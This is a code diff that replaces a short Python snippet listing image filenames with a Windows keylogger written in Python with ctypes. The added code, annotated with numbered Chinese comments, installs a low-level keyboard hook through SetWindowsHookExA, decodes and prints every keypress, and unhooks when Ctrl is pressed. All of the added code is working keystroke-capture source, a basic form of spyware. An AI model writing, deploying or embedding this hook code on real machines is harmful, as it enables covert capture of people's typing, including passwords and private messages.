@@ -1,20 +1,65 @@
-a = ['/data/product_images/jade_handle_image/source_image/721328.jpg',
-     '/data/product_images/jade_handle_image/source_image/1584187.jpg',
-     '/data/product_images/jade_handle_image/source_image/999708.jpg',
-     '/data/product_images/jade_handle_image/source_image/1544351.jpg',
-     '/data/product_images/jade_handle_image/source_image/1584188.jpg',
-     '/data/product_images/jade_handle_image/source_image/828309.jpg',
-     '/data/product_images/jade_handle_image/source_image/1343328.jpg']
-# import os
-# for i in a:
-#     print(os.path.basename(i))
-a = '''
-721328.jpg
-1584187.jpg
-999708.jpg
-1544351.jpg
-1584188.jpg
-828309.jpg
-1343328.jpg
-'''.split('\n')
-print(a)
+import sys
+from ctypes import *
+from ctypes.wintypes import MSG
+from ctypes.wintypes import DWORD
+
+user32 = windll.user32  # （1）使用windll声明user32与kernel32类型的变量
+kernel32 = windll.kernel32
+
+WH_KEYBOARD_LL = 13  # （2）变量声明
+WM_KEYDOWN = 0X0100
+CTRL_CODE = 162
+
+
+class KeyLogger:  # （3）定义类实现挂钩，拆钩功能。
+    def __init__(self):
+        self.lUser32 = user32
+        self.hooked = None
+
+    def installHookProc(self, pointer):  # （4）定义挂钩函数
+        self.hooked = self.lUser32.SetWindowsHookExA(
+            WH_KEYBOARD_LL,
+            pointer,
+            kernel32.GetModuleHandleW(None),
+            0
+        )
+        if not self.hooked:
+            return False
+        return True
+
+    def uninstallHookProc(self):  # （5）定义拆钩函数
+        if self.hooked is None:
+            return
+        self.lUser32.UnhookWindowsHookEx(self.hooked)
+        self.hooked = None
+
+
+def getFPTR(fn):  # （6）获取函数指针
+    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
+    return CMPFUNC(fn)
+
+
+def hookProc(nCode, wParam, lParam):  # （7）定义钩子过程
+    if wParam is not WM_KEYDOWN:
+        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
+    hookedKey = chr(0xFFFFFFFF & lParam[0])
+    print(hookedKey)
+    if (CTRL_CODE == int(lParam[0])):
+        print("Ctrl pressed, call uninstallHook()")
+        keyLogger.uninstallHookProc()
+        sys.exit(-1)
+    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
+
+
+def startKeyLog():  # （8）传递消息
+    msg = MSG()
+    user32.GetMessageA(byref(msg), 0, 0, 0)
+
+
+keyLogger = KeyLogger()  # （9）启动消息钩取
+pointer = getFPTR(hookProc)
+
+if keyLogger.installHookProc(pointer):
+    print("installed keyLogger")
+
+startKeyLog()
